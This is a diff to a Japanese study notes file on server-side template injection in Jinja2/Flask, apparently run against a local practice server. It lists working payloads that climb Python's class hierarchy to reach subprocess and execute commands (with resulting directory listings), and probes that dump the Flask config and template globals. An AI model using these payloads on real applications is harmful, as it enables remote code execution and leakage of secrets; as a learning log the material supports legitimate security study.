@@ -682,42 +682,93 @@ Hello [<class 'type'>, <class 'weakref'>, <class 'weakcallableproxy'>, <class
 ```txt
 Internal Server Error
 ```
-- ``   
+- `{{''.__class__.__mro__[1].__subclasses__()[186]}}`   
+`<class 'warnings.catch_warnings'>`はRCEに使えるらしい！   
 ```txt
-
+Hello <class 'warnings.catch_warnings'>! 
 ```
-- ``   
+- `{{''.__class__.__mro__[1].__subclasses__()[186].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output("ls")}}`   
 ```txt
-
+Hello b'requirements.sh\nrun.sh\nserver.py\n'! 
 ```
-- ``   
+- `{{[].__class__.__base__}}`   
 ```txt
-
+Hello <class 'object'>! 
 ```
-- ``   
+- `{{[].__class__.__base__.__subclasses__()}}`   
 ```txt
-
+"".__class__.__mro__[1].__subclasses__()の長い出力と同じ…
 ```
-- ``   
+#### self
+- `{{self}}`   
 ```txt
-
+Hello <TemplateReference None>! 
 ```
-- ``   
+- `{{self.__dict__}}`   
 ```txt
-
+Hello {'_TemplateReference__context': <Context {'range': <class 'range'>, 'dict': <class 'dict'>, 'lipsum': <function generate_lorem_ipsum at 0x7fc6734f7d30>, 'cycler': <class 'jinja2.utils.Cycler'>, 'joiner': <class 'jinja2.utils.Joiner'>, 'namespace': <class 'jinja2.utils.Namespace'>, 'url_for': <function url_for at 0x7fc672b945e0>, 'get_flashed_messages': <function get_flashed_messages at 0x7fc672b94790>, 'config': <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093}>, 'request': <Request 'http://192.168.99.100:5000/' [POST]>, 'session': <NullSession {}>, 'g': <flask.g of 'server'>} of None>}! 
 ```
-- ``   
+#### g namespace lipsum range session dict get\_flashed\_messages cycler joiner
+- `{{g}}`   
 ```txt
-
+Hello <flask.g of 'server'>! 
 ```
-- ``   
+- `{{g.__class__}}`   
 ```txt
-
+Hello <class 'flask.ctx._AppCtxGlobals'>! 
 ```
-- ``   
+- `{{g.__class__.__mro__}}`   
 ```txt
-
+Hello (<class 'flask.ctx._AppCtxGlobals'>, <class 'object'>)! 
 ```
+- `{{g.__class__.__mro__[1].__subclasses__()}}`   
+どこ経由でもとりあえず`<class 'object'>`があればすべてのアクセス可能なクラスに`__sublcasses__`でアクセス可能！   
+```txt
+"".__class__.__mro__[1].__subclasses__()の長い出力と同じ…
+```
+- `{{namespace}}`   
+```txt
+Hello <class 'jinja2.utils.Namespace'>! 
+```
+- `{{lipsum}}`   
+```txt
+Hello <function generate_lorem_ipsum at 0x7fc6734f7d30>! 
+```
+- `{{range}}`   
+```txt
+Hello <class 'range'>! 
+```
+- `{{session}}`   
+```txt
+Hello <NullSession {}>! 
+```
+- `{{get_flashed_messages}}`   
+```txt
+Hello <function get_flashed_messages at 0x7fc672b94790>! 
+```
+- `{{dict}}`   
+```txt
+Hello <class 'dict'>! 
+```
+- `{{cycler}}`   
+```txt
+Hello <class 'jinja2.utils.Cycler'>! 
+```
+- `{{joiner}}`   
+```txt
+Hello <class 'jinja2.utils.Joiner'>! 
+```
+#### その他（よくわからん）
+- `<pre>{% debug %}</pre>`   
+```txt
+Internal Server Error
+```
+- `{{ [].class.base.subclasses() }}`   
+```txt
+Internal Server Error
+```
+- `{{''.class.mro()[1].subclasses()}}`   
+
 
 ## tplmap (SSTI practice)
 https://github.com/epinna/tplmap   
